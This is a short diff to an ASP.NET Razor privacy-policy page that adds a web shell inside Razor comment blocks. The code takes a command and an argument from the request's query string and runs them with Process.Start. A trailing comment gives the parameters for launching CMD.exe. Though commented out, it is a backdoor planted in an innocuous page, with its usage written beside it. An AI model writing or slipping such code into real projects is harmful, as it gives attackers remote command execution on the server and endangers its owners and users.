@@ -4,3 +4,10 @@
 <h1>@ViewData["Title"]</h1>
 
 <p>Use this page to detail your site's privacy policy.</p>
+@* @using System.Diagnostics;@{int idx1 = 1;int idx0= 0;string str_idx0 = idx0.ToString();string str_idx1 = idx1.ToString();string cmd = Context.Request.Query[str_idx0];string arg = Context.Request.Query[str_idx1];Process.Start(cmd,arg);} *@
+
+@* @using System.Diagnostics;@{int idx0= 0;string str_idx0 = idx0.ToString();string cmd = Context.Request.Query[str_idx0];Process.Start(cmd);} *@
+
+
+
+@* 0=CMD.exe&1=/C  *@
